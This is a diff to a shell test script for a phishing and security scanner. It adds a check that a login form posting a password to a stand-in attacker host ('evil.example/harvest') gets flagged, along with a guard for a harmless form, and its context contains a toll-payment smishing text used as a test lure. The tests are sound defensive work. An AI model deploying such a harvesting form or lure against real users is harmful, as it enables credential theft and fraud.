@@ -632,6 +632,18 @@ rm -rf "$VCS_DIR"
     && check "ctl/rootdot FP guard: clean host stays clean" "0" "1" \
     || check "ctl/rootdot FP guard: clean host stays clean" "0" "0"
 
+# F13: credential-harvest HTML form → flagged; relative action → clean
+CF_DIR=$(mktemp -d)
+printf '<html><body><form action="https://evil.example/harvest" method="post"><input name="user"><input name="password" type="password"></form></body></html>' > "$CF_DIR/login.html"
+./hlse_core file "$CF_DIR/login.html" 2>&1 | grep -q "F13" \
+    && check "F13: remote-action password form flagged" "0" "0" \
+    || check "F13: remote-action password form flagged" "0" "1"
+printf '<html><body><form action="/login" method="post"><input name="password" type="password"></form></body></html>' > "$CF_DIR/local.html"
+./hlse_core file "$CF_DIR/local.html" 2>&1 | grep -q "F13" \
+    && check "F13 FP guard: relative-action form clean" "0" "1" \
+    || check "F13 FP guard: relative-action form clean" "0" "0"
+rm -rf "$CF_DIR"
+
 # Toll-road smishing (E-ZPass + urgency + payment) → ALERT/BLOCK
 ./hlse_core "E-ZPass: your account has an outstanding toll balance. Settle immediately to avoid penalties." 2>&1 | grep -qE "ALERT|BLOCK|ISOLATE" \
     && check "toll smishing (E-ZPass outstanding balance) → ALERT+" "0" "0" \
